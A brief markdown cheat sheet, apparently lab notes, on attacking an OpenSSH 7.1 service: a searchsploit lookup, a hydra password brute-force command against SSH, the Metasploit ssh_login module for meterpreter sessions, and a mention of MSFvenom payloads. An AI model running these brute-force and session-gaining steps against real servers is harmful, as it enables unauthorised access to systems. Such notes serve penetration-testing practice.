# Exploiting OpenSSH
1. Check searchsploit -- ```searchsploit openssh 7.1```
2. Brute force login -- ```hydra -l  vagrant -P /usr/share/metasploit/unix_users.txt (target IP) ssh```
3. login

**Get meterpreter sessions**  
module: auxiliary/scanner/ssh/ssh_login 

if upgrading session doesnt work, create an MSFvenom payload

Obtain Windows CMD session in SSH -- ```bash```
